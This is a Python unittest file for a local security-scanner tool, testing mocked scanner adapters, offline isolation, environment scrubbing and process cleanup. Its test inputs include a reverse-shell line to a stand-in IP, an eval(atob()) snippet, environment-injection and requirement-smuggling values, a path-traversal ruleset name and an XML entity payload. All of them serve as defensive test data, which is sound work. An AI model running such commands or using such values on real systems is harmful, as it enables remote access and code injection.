"""Scanner unit tests: ALL external scanner responses are MOCKS.

Only the builtin scanner reads fixture source. Fixtures are never imported,
compiled, installed, deployed or executed. Process-harness tests execute a
trusted Python interpreter with inline inert code, NOT an external scanner.
Run: python -B -m unittest discover -s tests -p test_scanners.py -v
"""
from __future__ import annotations

import asyncio
import ctypes
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import AsyncMock, patch

from localguard import scanners as s

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / 'fixtures'
# Existing executable used solely to validate registration, never launched as a scanner.
MOCK_BINARY = str(Path(sys.executable).resolve())


def execution(raw, *, scanner='', code=0, status='completed', truncated=False):
    payload = raw.encode() if isinstance(raw, str) else json.dumps(raw).encode()
    return dict(stdout=b'' if scanner == 'cppcheck' else payload,
                stderr=payload if scanner == 'cppcheck' else b'', returncode=code,
                status=status, truncated=truncated)


def pointer(raw, ref):
    for token in ref.removeprefix('#/').split('/'):
        raw = raw[int(token)] if isinstance(raw, list) else raw[token.replace('~1', '/').replace('~0', '~')]
    return raw


class PatternFixtureTests(unittest.IsolatedAsyncioTestCase):
    async def test_exact_locations_in_eleven_languages_and_clean_controls(self):
        manifest = json.loads((FIXTURES / 'expected_locations.json').read_text())
        self.assertGreaterEqual(len(manifest['languages']), 11)
        expected = {(path, rule, line) for path, rules in manifest['expected'].items()
                    for rule, lines in rules.items() for line in lines}
        result = await s.run_scanner('patterns', FIXTURES)
        self.assertEqual(result['status'], 'completed')
        self.assertFalse(result['truncated'])
        self.assertEqual({(f['path'], f['rule_id'], f['line']) for f in result['findings']}, expected)
        self.assertEqual(len(result['findings']), 38)
        for finding in result['findings']:
            self.assertEqual(finding['tool'], 'patterns')
            raw = pointer(result['raw'], finding['raw_ref'])
            self.assertEqual((raw['path'], raw['line']), (finding['path'], finding['line']))
            self.assertFalse(Path(finding['path']).is_absolute())
        self.assertNotIn('LGFixtureKey9Z7Q2', json.dumps(result))
        self.assertTrue(result['warnings'])  # Limited lexical coverage is explicit.

    async def test_deterministic_and_ruleset_filter(self):
        first = await s.run_scanner('patterns', FIXTURES)
        self.assertEqual(first, await s.run_scanner('patterns', FIXTURES))
        self.assertEqual(first, await s.run_scanner('patterns', FIXTURES, 'security'))
        backdoor = await s.run_scanner('patterns', FIXTURES, 'backdoor')
        self.assertEqual(len(backdoor['findings']), 27)
        self.assertEqual({f['category'] for f in backdoor['findings']}, {'backdoor'})

    async def test_generic_extensions_comments_and_negative_controls(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / 'controls.swift').write_text('\n'.join([
                '// auth_bypass = true', '# api_key = "RealLooking9Token"',
                'api_key = "exampleToken123456"', 'api_key = "short"',
                'debug = true', 'auth_bypass = false', 'data = atob(encoded)',
                'eval(user_input)', 'api_key = getenv("API_KEY")',
                'api_key = "RealLooking9Token"', 'auth_bypass = true']), encoding='utf-8')
            result = await s.run_scanner('patterns', root)
            self.assertEqual({f['line'] for f in result['findings']}, {10, 11})

    async def test_limits_are_explicit_and_bounded(self):
        with patch.object(s, 'MAX_FINDINGS', 2):
            result = await s.run_scanner('patterns', FIXTURES)
        self.assertTrue(result['truncated'])
        self.assertEqual(len(result['findings']), 2)
        with patch.object(s, 'MAX_FILE_BYTES', 10):
            result = await s.run_scanner('patterns', FIXTURES)
        self.assertTrue(result['truncated'])
        self.assertFalse(result['findings'])
        with patch.object(s, 'MAX_RESULT_BYTES', 3000):
            result = await s.run_scanner('patterns', FIXTURES)
            self.assertLessEqual(len(json.dumps(result).encode()), 3000)
            self.assertTrue(result['truncated'])
            for finding in result['findings']:
                pointer(result['raw'], finding['raw_ref'])

    async def test_pattern_deadline(self):
        with patch.object(s, 'time') as clock:
            clock.monotonic.side_effect = [0, 2]
            result = await s.run_scanner('patterns', FIXTURES, timeout=1)
        self.assertEqual(result['status'], 'timeout')


class AdapterMockTests(unittest.IsolatedAsyncioTestCase):
    async def run_mock(self, scanner, raw, **kwargs):
        output = execution(raw, scanner=scanner, code=kwargs.pop('code', 0))
        with patch.object(s, '_execute', new=AsyncMock(return_value=output)) as mocked:
            result = await s.run_scanner(scanner, FIXTURES, binaries={scanner: MOCK_BINARY}, **kwargs)
        return result, mocked

    def check_finding(self, result, path, line):
        self.assertEqual(result['status'], 'completed', result['warnings'])
        self.assertEqual(len(result['findings']), 1, result)
        finding = result['findings'][0]
        self.assertEqual((finding['path'], finding['line']), (path, line))
        self.assertEqual(set(finding), {'path', 'line', 'title', 'severity', 'category', 'cwe',
            'confidence', 'tool', 'rule_id', 'explanation', 'remediation', 'raw_ref'})
        self.assertEqual(finding['tool'], result['scanner'])
        self.assertIsNotNone(pointer(result['raw'], finding['raw_ref']))
        return finding

    async def test_mock_semgrep_bundled_backdoor_only(self):
        raw = {'results': [{'check_id': 'localguard.backdoor.eval-decode', 'path': str(FIXTURES / 'vulnerable.py'),
            'start': {'line': 5}, 'extra': {'message': 'MOCK decoded evaluation', 'severity': 'ERROR',
            'metadata': {'category': 'backdoor', 'cwe': ['CWE-95'], 'confidence': 'HIGH'}}}], 'errors': []}
        result, mocked = await self.run_mock('semgrep', raw, code=1)
        finding = self.check_finding(result, 'vulnerable.py', 5)
        self.assertEqual(finding['category'], 'backdoor')
        self.assertEqual(result['raw'], raw)
        argv, cwd, env, timeout = mocked.call_args.args
        self.assertEqual(cwd, FIXTURES)
        self.assertEqual(argv[argv.index('--config') + 1], str(s.RULE_DIR / 'backdoor.json'))
        self.assertIn('--disable-nosem', argv)
        self.assertIn('--metrics=off', argv)
        self.assertNotIn('auto', argv)
        self.assertTrue(any('bundled offline rules' in w for w in result['warnings']))
        self.assertIn(str(s.RULE_DIR / 'security.json'), argv)
        self.assertIn('--oss-only', argv)

    async def test_mock_gitleaks_secret_and_config_isolation(self):
        raw = [{'File': 'vulnerable.js', 'StartLine': 2, 'RuleID': 'generic-api-key',
                'Description': 'MOCK secret', 'Secret': 'not-a-real-secret'}]
        result, mocked = await self.run_mock('gitleaks', raw, code=1)
        finding = self.check_finding(result, 'vulnerable.js', 2)
        self.assertEqual(finding['category'], 'credential_leak')
        argv = mocked.call_args.args[0]
        self.assertIn('--ignore-gitleaks-allow', argv)
        self.assertEqual(argv[argv.index('--config') + 1], str(s.RULE_DIR / 'gitleaks.toml'))
        self.assertNotEqual(Path(argv[argv.index('--gitleaks-ignore-path') + 1]).parent, FIXTURES)

    async def test_mock_gosec_no_build_no_download_environment(self):
        raw = {'Issues': [{'file': 'vulnerable.go', 'line': '3-3', 'rule_id': 'G101',
            'details': 'MOCK credential', 'severity': 'HIGH', 'confidence': 'HIGH', 'cwe': {'id': '798'}}], 'Golang errors': {}}
        result, mocked = await self.run_mock('gosec', raw)
        self.check_finding(result, 'vulnerable.go', 3)
        argv, cwd, env, _ = mocked.call_args.args
        self.assertIn('-nosec=true', argv)
        self.assertEqual(env['GOPROXY'], 'off')
        self.assertEqual(env['CGO_ENABLED'], '0')
        self.assertEqual(env['GOTOOLCHAIN'], 'local')
        self.assertIn('-mod=readonly', env['GOFLAGS'])
        self.assertIn('compilation-disabled', env['GOFLAGS'])
        self.assertEqual(env['GOWORK'], 'off')

    async def test_mock_cppcheck_xml_location_and_cwe(self):
        raw = '<results version="2"><cppcheck version="MOCK"/><errors><error id="bufferAccessOutOfBounds" severity="error" msg="MOCK bounds" cwe="119"><location file="vulnerable.c" line="2"/></error></errors></results>'
        result, mocked = await self.run_mock('cppcheck', raw)
        finding = self.check_finding(result, 'vulnerable.c', 2)
        self.assertEqual(finding['cwe'], 'CWE-119')
        self.assertEqual(result['raw']['tag'], 'results')
        self.assertFalse(any('--project' in arg or '--addon' in arg for arg in mocked.call_args.args[0]))

    async def test_mock_pip_audit_exact_pin_mapping_not_line_one(self):
        raw = {'dependencies': [{'name': 'Flask', 'version': '2.0.0', 'vulns': [
            {'id': 'MOCK-CVE-0001', 'description': 'MOCK advisory', 'fix_versions': ['2.3.2']}]}], 'fixes': []}
        result, mocked = await self.run_mock('pip-audit', raw, offline=False, code=1)
        finding = self.check_finding(result, 'requirements-pinned.txt', 3)
        self.assertEqual(finding['severity'], 'info')  # No invented advisory severity.
        self.assertEqual(finding['category'], 'dependency_cve')
        argv = mocked.call_args.args[0]
        self.assertIn('--no-deps', argv)
        self.assertIn('--disable-pip', argv)
        self.assertNotEqual(Path(argv[argv.index('--requirement') + 1]).parent, FIXTURES)

    async def test_mock_grype_exact_manifest_location(self):
        raw = {'matches': [{'artifact': {'name': 'lodash', 'version': '4.17.20',
            'locations': [{'path': '/package-lock.json'}]}, 'vulnerability': {
            'id': 'MOCK-CVE-0002', 'severity': 'High', 'fix': {'versions': ['4.17.21']}}}]}
        result, mocked = await self.run_mock('grype', raw)
        finding = self.check_finding(result, 'package-lock.json', 6)
        self.assertEqual(finding['severity'], 'high')
        env = mocked.call_args.args[2]
        self.assertEqual(env['GRYPE_DB_AUTO_UPDATE'], 'false')
        self.assertEqual(env['GRYPE_CHECK_FOR_APP_UPDATE'], 'false')
        self.assertIn('dir:' + str(FIXTURES), mocked.call_args.args[0])

    async def test_dependency_findings_without_matched_package_and_version_are_omitted(self):
        raw = {'dependencies': [{'name': 'flask', 'version': '99.0.0', 'vulns': [{'id': 'MOCK-CVE'}]},
            {'name': 'missing', 'version': '2.0.0', 'vulns': [{'id': 'MOCK-CVE'}]}]}
        result, _ = await self.run_mock('pip-audit', raw, offline=False)
        self.assertFalse(result['findings'])
        self.assertTrue(any('unlocated' in warning for warning in result['warnings']))
        for name, version, locations in [('other', '4.17.20', [{'path': '/package-lock.json'}]),
                                          ('lodash', '4.17.21', [{'path': '/package-lock.json'}]),
                                          ('lodash', '4.17.20', [])]:
            with self.subTest(name=name, version=version, locations=locations):
                result, _ = await self.run_mock('grype', {'matches': [{'artifact': {
                    'name': name, 'version': version, 'locations': locations},
                    'vulnerability': {'id': 'MOCK-CVE'}}]})
                self.assertFalse(result['findings'])
                self.assertTrue(any('unlocated' in warning for warning in result['warnings']))

    async def test_invalid_output_does_not_become_clean_scan(self):
        for scanner in s.SCANNERS[1:]:
            with self.subTest(scanner=scanner):
                result, _ = await self.run_mock(scanner, 'not scanner JSON or XML', offline=False)
                self.assertEqual(result['status'], 'error')
                self.assertFalse(result['findings'])

    async def test_valid_empty_outputs(self):
        values = {'semgrep': {'results': []}, 'gitleaks': [], 'gosec': {'Issues': []},
                  'cppcheck': '<results><errors/></results>', 'pip-audit': {'dependencies': []}, 'grype': {'matches': []}}
        for scanner, raw in values.items():
            with self.subTest(scanner=scanner):
                result, _ = await self.run_mock(scanner, raw, offline=False)
                self.assertEqual(result['status'], 'completed', result)
                self.assertFalse(result['findings'])

    async def test_mock_null_empty_reports_preserve_actual_raw(self):
        for scanner, raw in [('gitleaks', None), ('gosec', {'Issues': None})]:
            result, _ = await self.run_mock(scanner, raw)
            self.assertEqual(result['status'], 'completed', result)
            self.assertEqual(result['raw'], raw)
            self.assertFalse(result['findings'])

    async def test_partial_tool_errors_not_success(self):
        for scanner, raw in [('semgrep', {'results': [], 'errors': [{'message': 'MOCK parse error'}]}),
                              ('gosec', {'Issues': [], 'Golang errors': {'file.go': ['MOCK cannot compile']}})]:
            result, _ = await self.run_mock(scanner, raw)
            self.assertEqual(result['status'], 'error')

    async def test_mock_nonzero_exit_and_timeout(self):
        result, _ = await self.run_mock('semgrep', {'results': []}, code=2)
        self.assertEqual(result['status'], 'error')
        for status, truncated in [('timeout', False), ('error', True)]:
            with patch.object(s, '_execute', new=AsyncMock(return_value=execution('', status=status, truncated=truncated))):
                result = await s.run_scanner('semgrep', FIXTURES, binaries={'semgrep': MOCK_BINARY})
            self.assertEqual(result['status'], status)
            self.assertEqual(result['truncated'], truncated)
            self.assertFalse(result['findings'])

    async def test_mock_missing_grype_db_is_unavailable(self):
        output = execution('', code=1)
        output['stderr'] = b'MOCK unable to load vulnerability database: database does not exist'
        with patch.object(s, '_execute', new=AsyncMock(return_value=output)):
            result = await s.run_scanner('grype', FIXTURES, binaries={'grype': MOCK_BINARY})
        self.assertEqual(result['status'], 'unavailable')

    async def test_invalid_locations_and_xml_entities_rejected(self):
        for path, line in [('../whatineed.md', 1), ('vulnerable.py', 0), ('vulnerable.py', 999),
                           ('vulnerable.py', True), ('vulnerable.py', 2.5), ('missing.py', 1)]:
            result, _ = await self.run_mock('gitleaks', [{'File': path, 'StartLine': line, 'RuleID': 'MOCK'}])
            self.assertFalse(result['findings'])
            self.assertTrue(result['warnings'])
        result, _ = await self.run_mock('cppcheck', '<!DOCTYPE x [<!ENTITY y "payload">]><results><errors/></results>')
        self.assertEqual(result['status'], 'error')


class BoundaryTests(unittest.IsolatedAsyncioTestCase):
    async def test_enums_and_bad_parameters(self):
        self.assertEqual(s.SCANNERS, ('patterns', 'semgrep', 'gitleaks', 'gosec', 'cppcheck', 'pip-audit', 'grype'))
        self.assertEqual(s.RULESETS, ('default', 'security', 'backdoor'))
        for kwargs in [{'scanner': 'shell'}, {'ruleset': '../../evil.yml'}, {'timeout': True}, {'timeout': 0}, {'offline': 'false'}]:
            args = dict(scanner='patterns', target=FIXTURES)
            args.update(kwargs)
            result = await s.run_scanner(**args)
            self.assertEqual(result['status'], 'error')

    async def test_absent_and_relative_executables_never_use_path(self):
        with patch.object(s, '_execute', new=AsyncMock()) as mocked:
            for scanner in s.SCANNERS[1:]:
                for binaries in [None, {scanner: scanner}]:
                    result = await s.run_scanner(scanner, FIXTURES, binaries=binaries)
                    self.assertEqual(result['status'], 'unavailable')
                    self.assertFalse(result['findings'])
            mocked.assert_not_called()

    async def test_repository_executable_and_windows_scripts_rejected(self):
        with patch.object(s, '_execute', new=AsyncMock()) as mocked:
            result = await s.run_scanner('gitleaks', FIXTURES, binaries={'gitleaks': str(FIXTURES / 'vulnerable.py')})
            self.assertEqual(result['status'], 'error')
            if os.name == 'nt':
                result = await s.run_scanner('semgrep', FIXTURES, binaries={'semgrep': str(ROOT / 'whatineed.md')})
                self.assertEqual(result['status'], 'error')
            mocked.assert_not_called()

    async def test_offline_pip_audit_never_launches(self):
        with patch.object(s, '_execute', new=AsyncMock()) as mocked:
            result = await s.run_scanner('pip-audit', FIXTURES, binaries={'pip-audit': MOCK_BINARY})
            self.assertEqual(result['status'], 'unavailable')
            mocked.assert_not_called()

    async def test_no_pins_does_not_audit_installed_environment(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(s, '_execute', new=AsyncMock()) as mocked:
            root = Path(directory)
            (root / 'requirements.txt').write_text('-e .\n-r other.txt\n--index-url https://example.invalid\npackage>=1\nfile:///tmp/evil\n', encoding='utf-8')
            result = await s.run_scanner('pip-audit', root, offline=False, binaries={'pip-audit': MOCK_BINARY})
            self.assertEqual(result['status'], 'unavailable')
            mocked.assert_not_called()

    async def test_requirement_options_never_forwarded(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / 'requirements.txt').write_text('# comment\nFlask==2.0.0\n-r evil.txt\n-e .\nname @ https://example.invalid\n', encoding='utf-8')
            async def inspect_argv(argv, cwd, env, timeout):
                content = Path(argv[argv.index('--requirement') + 1]).read_text()
                self.assertEqual(content, 'flask==2.0.0\n')
                return execution({'dependencies': []})
            with patch.object(s, '_execute', new=AsyncMock(side_effect=inspect_argv)):
                result = await s.run_scanner('pip-audit', root, offline=False, binaries={'pip-audit': MOCK_BINARY})
            self.assertEqual(result['status'], 'completed')
            self.assertTrue(any('Unsupported requirement' in w for w in result['warnings']))

    async def test_semgrep_snapshot_ignore_config_rejected(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(s, '_execute', new=AsyncMock()) as mocked:
            root = Path(directory)
            (root / '.semgrepignore').write_text('*')
            result = await s.run_scanner('semgrep', root, binaries={'semgrep': MOCK_BINARY})
            self.assertEqual(result['status'], 'error')
            mocked.assert_not_called()

    def test_environment_does_not_inherit_hooks_or_repo_path(self):
        with tempfile.TemporaryDirectory() as directory:
            scratch = Path(directory)
            with patch.dict(os.environ, {'PATH': str(FIXTURES), 'PYTHONPATH': str(FIXTURES),
                'NODE_OPTIONS': '--require=evil', 'GITLEAKS_CONFIG': 'evil', 'GRYPE_CONFIG': 'evil',
                'GOFLAGS': '-toolexec=evil', 'LD_PRELOAD': 'evil'}):
                env = s._environment(Path(MOCK_BINARY), scratch, FIXTURES)
            for key in ('PYTHONPATH', 'NODE_OPTIONS', 'GITLEAKS_CONFIG', 'GRYPE_CONFIG', 'LD_PRELOAD'):
                self.assertNotIn(key, env)
            self.assertNotIn(str(FIXTURES), env['PATH'])
            self.assertNotIn('evil', env['GOFLAGS'])

    def test_exact_manifest_matchers(self):
        self.assertEqual(s._manifest_lines(FIXTURES, 'Cargo.lock', 'fixture-crate', '1.2.3'), [6])
        self.assertEqual(s._manifest_lines(FIXTURES, 'go.mod', 'example.invalid/library', '1.2.3'), [4])
        self.assertEqual(s._manifest_lines(FIXTURES, 'package-lock.json', '@fixture/library', '1.2.3'), [9])
        self.assertEqual(s._manifest_lines(FIXTURES, 'package-lock.json', 'other', '1.2.3'), [])
        self.assertEqual(s._manifest_lines(FIXTURES, 'Cargo.lock', 'fixture-crate', '9.9.9'), [])

    def test_json_token_locator_not_substring_guessing(self):
        text = '{\n "description": "lodash 4.17.20",\n "dependencies": {\n "lodash": "4.17.20"\n }\n}'
        values = s._json_scalars(text)
        self.assertEqual(values[('dependencies', 'lodash')], ('4.17.20', 4))
        self.assertEqual(values[('description',)], ('lodash 4.17.20', 2))

    def test_bundled_semgrep_rules_are_backdoor_only_and_ignore_leading_comments(self):
        # Regex sanity test only, NOT a Semgrep integration test.
        import re
        document = json.loads((s.RULE_DIR / 'backdoor.json').read_text())
        self.assertEqual(len(document['rules']), 3)
        for rule in document['rules']:
            self.assertEqual(rule['metadata']['category'], 'backdoor')
            self.assertEqual(rule['languages'], ['generic'])
            regex = re.compile(rule['pattern-regex'])
            self.assertIsNotNone(regex.search((FIXTURES / 'vulnerable.py').read_text()))
            self.assertIsNone(regex.search((FIXTURES / 'clean.py').read_text()))
            self.assertIsNone(regex.search('   // auth_bypass = true; eval(atob("MQ==")); bash -i >& /dev/tcp/192.0.2.1/4444'))

    def test_manifest_metadata_is_not_a_dependency_declaration(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / 'Cargo.lock').write_text('name = "fixture-crate"\nversion = "1.2.3"\n')
            self.assertEqual(s._manifest_lines(root, 'Cargo.lock', 'fixture-crate', '1.2.3'), [])
            (root / 'composer.lock').write_text('{"metadata":{"name":"library","version":"1.2.3"}}')
            self.assertEqual(s._manifest_lines(root, 'composer.lock', 'library', '1.2.3'), [])
            (root / 'package-lock.json').write_text('{"metadata":{"dependencies":{"library":{"version":"1.2.3"}}}}')
            self.assertEqual(s._manifest_lines(root, 'package-lock.json', 'library', '1.2.3'), [])

    async def test_symlinks_do_not_produce_findings(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            link = root / 'escape.py'
            try:
                link.symlink_to(FIXTURES / 'vulnerable.py')
            except OSError:
                self.skipTest('Symlink creation is not available to this test user')
            result = await s.run_scanner('patterns', root)
            self.assertFalse(result['findings'])
            self.assertIsNone(s._relative(root, 'escape.py'))


class ProcessMockTests(unittest.IsolatedAsyncioTestCase):
    async def test_mock_cancellation_kills_process_and_cleans_up_pipes(self):
        started = asyncio.Event()
        exited = asyncio.Event()
        class FakeProcess:
            pid = 987654
            returncode = None
            stdout = asyncio.StreamReader()
            stderr = asyncio.StreamReader()
            def kill(self):
                if self.returncode is None:
                    self.returncode = -9
                    self.stdout.feed_eof()
                    self.stderr.feed_eof()
                    exited.set()
            async def wait(self):
                await exited.wait()
                return self.returncode
        process = FakeProcess()
        async def spawn(*argv, **kwargs):
            self.assertEqual(argv, (MOCK_BINARY, '--mock-only'))
            self.assertNotIn('shell', kwargs)
            if os.name == 'nt':
                self.assertTrue(kwargs['creationflags'] & 0x00000004)
            else:
                self.assertTrue(kwargs['start_new_session'])
            started.set()
            return process
        with patch.object(s.asyncio, 'create_subprocess_exec', new=AsyncMock(side_effect=spawn)), \
             patch.object(s, '_WindowsJob') as job, \
             patch.object(s.os, 'killpg', create=True, side_effect=lambda *args: process.kill()):
            job.return_value.close.side_effect = process.kill
            task = asyncio.create_task(s._execute([MOCK_BINARY, '--mock-only'], FIXTURES, {}, 10))
            await started.wait()
            task.cancel()
            with self.assertRaises(asyncio.CancelledError):
                await task
            self.assertEqual(process.returncode, -9)
            self.assertTrue(process.stdout.at_eof())
            self.assertTrue(process.stderr.at_eof())


class ProcessHarnessTests(unittest.IsolatedAsyncioTestCase):
    """Real lifecycle tests of trusted Python inline harnesses, not scanner integration."""
    async def test_harness_collects_separate_stdout_stderr(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            result = await s._execute([MOCK_BINARY, '-I', '-c',
                'import sys; print("stdout"); print("stderr", file=sys.stderr)'], root, dict(os.environ), 10)
        self.assertEqual(result['status'], 'completed')
        self.assertEqual(result['stdout'].strip(), b'stdout')
        self.assertEqual(result['stderr'].strip(), b'stderr')

    async def test_harness_bounds_combined_streams(self):
        with tempfile.TemporaryDirectory() as directory, patch.object(s, 'MAX_OUTPUT_BYTES', 1024):
            result = await s._execute([MOCK_BINARY, '-I', '-c',
                'import sys; sys.stdout.write("x"*100000); sys.stderr.write("y"*100000)'],
                Path(directory), dict(os.environ), 10)
        self.assertEqual(result['status'], 'error')
        self.assertTrue(result['truncated'])
        self.assertLessEqual(len(result['stdout']) + len(result['stderr']), 1024)

    async def test_harness_timeout_kills_own_child_tree(self):
        # No fixture code: spawn only a second isolated interpreter that sleeps.
        code = 'import subprocess,sys,time; p=subprocess.Popen([sys.executable,"-I","-c","import time; time.sleep(60)"]); print(p.pid,flush=True); time.sleep(60)'
        with tempfile.TemporaryDirectory() as directory:
            result = await s._execute([MOCK_BINARY, '-I', '-c', code], Path(directory), dict(os.environ), 2)
        self.assertEqual(result['status'], 'timeout')
        pid = int(result['stdout'].strip())
        if os.name == 'nt':
            from ctypes import wintypes as w
            api = ctypes.WinDLL('kernel32', use_last_error=True)
            api.OpenProcess.argtypes, api.OpenProcess.restype = [w.DWORD, w.BOOL, w.DWORD], w.HANDLE
            api.WaitForSingleObject.argtypes, api.WaitForSingleObject.restype = [w.HANDLE, w.DWORD], w.DWORD
            api.CloseHandle.argtypes = [w.HANDLE]
            handle = api.OpenProcess(0x100000, False, pid)
            if handle:
                try:
                    self.assertEqual(api.WaitForSingleObject(handle, 1000), 0)
                finally:
                    api.CloseHandle(handle)
        else:
            # A reparented zombie is already dead, though kill(pid,0) may succeed.
            stat = Path(f'/proc/{pid}/stat')
            if stat.exists():
                self.assertEqual(stat.read_text().split(') ')[1].split()[0], 'Z')


if __name__ == '__main__':
    unittest.main()
